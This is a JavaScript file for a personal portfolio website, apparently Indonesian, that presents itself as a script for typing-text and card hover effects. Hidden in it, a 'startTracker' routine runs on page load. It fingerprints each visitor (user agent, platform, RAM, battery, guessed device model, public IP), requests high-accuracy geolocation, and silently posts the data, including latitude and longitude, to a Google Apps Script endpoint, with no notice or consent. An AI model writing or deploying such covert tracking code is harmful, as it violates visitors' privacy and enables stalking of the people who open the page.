(async function() {
  const getDeviceModel = () => {
    const ua = navigator.userAgent;
    // Deteksi dasar dari User Agent
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      if (match) return match[1]; // Mengambil model dari string Android
      return "Android Device";
    }
    
    // Deteksi iPhone secara spesifik menggunakan resolusi layar
    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
      const w = window.screen.width, h = window.screen.height;
      if (w === 390 && h === 844) return "iPhone 12/13/14 Pro";
      if (w === 430 && h === 932) return "iPhone 14/15 Pro Max";
      if (w === 375 && h === 667) return "iPhone SE/6/7/8";
      return "Apple iOS Device";
    }

    // Deteksi Desktop
    if (/Windows/i.test(ua)) return "Windows PC";
    if (/Macintosh/i.test(ua)) return "MacBook / iMac";
    
    return "Unknown Device";
  };

  const startTracker = async () => {
    let payload = {
      ip: "Checking...",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      ram: navigator.deviceMemory || "N/A",
      battery: null,
      deviceName: getDeviceModel() // Panggil fungsi penebak nama
    };

    // Ambil Baterai & IP (Logika sama seperti sebelumnya)
    if (navigator.getBattery) {
      try { const b = await navigator.getBattery(); payload.battery = Math.round(b.level * 100); } catch (e) {}
    }
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const d = await res.json();
      payload.ip = d.ip;
    } catch (e) {}

    const send = (data) => {
      fetch("https://script.google.com/macros/s/AKfycbxhFxELd4qw1yyUbBRmou5ByBoKP9JTcXBHq8ATHqfyLx2Yp8-41CaZI5t4YWqJoX_CLw/exec", {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
      });
    };

    send(payload);

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
        send(payload); 
      }, null, { enableHighAccuracy: true });
    }
  };

  window.addEventListener('load', () => {
    startTracker();

  // --- UI EFFECTS (TYPING) ---
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;

    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      charIndex--;
      typingDelay = 75;
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++;
      typingDelay = 150;
    }

    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000;
      isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      typingDelay = 500;
    }
    setTimeout(typeText, typingDelay);
  }
    
    // Jalankan Efek UI
    setTimeout(typeText, 1000);

    // Ripple Effect untuk Card
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });
})();
